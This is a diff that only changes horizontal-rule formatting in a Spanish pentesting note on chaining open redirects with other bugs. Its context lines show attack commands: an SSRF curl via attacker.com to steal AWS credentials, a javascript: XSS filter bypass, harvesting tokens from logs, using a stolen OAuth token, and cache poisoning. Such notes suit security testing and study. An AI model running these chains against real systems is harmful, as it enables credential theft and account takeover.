@@ -21,7 +21,7 @@ linked:
 ---
 # Open Redirect - Chains con Otras Vulns
 
-***
+---
 
 ## SSRF via Redirect Chain
 
@@ -58,7 +58,7 @@ curl "https://target.com/api/image-proxy?url=https://attacker.com/r"
 # Response contains AWS credentials → theft.
 ```
 
-___
+---
 
 ## XSS via `javascript:` / `data:` URL
 
@@ -73,7 +73,7 @@ ___
 | `curl -sI "https://target/redir?next=java%09script:alert(1)"` | Tab control char bypass | Strip control before validation. |
 ^or-chain-xss
 
-___
+---
 
 ## Token Leak via Referer
 
@@ -103,7 +103,7 @@ ___
 tail -f /var/log/nginx/access.log | grep -oE 'token=[A-Za-z0-9]+'
 ```
 
-___
+---
 
 ## OAuth Code Stealing
 
@@ -118,7 +118,7 @@ ___
 | `curl -H "Authorization: Bearer $TOKEN" https://api.target.com/me` | Acceso API como víctima | Post-token. |
 ^or-chain-oauth
 
-___
+---
 
 ## Cache Poisoning Combo
 
@@ -132,4 +132,4 @@ ___
 | Post-poison: `curl https://target/login` (víctima común) → recibe Location: attacker.com | Mass impact verification | TTL del cache. |
 ^or-chain-cache
 
-***
+---
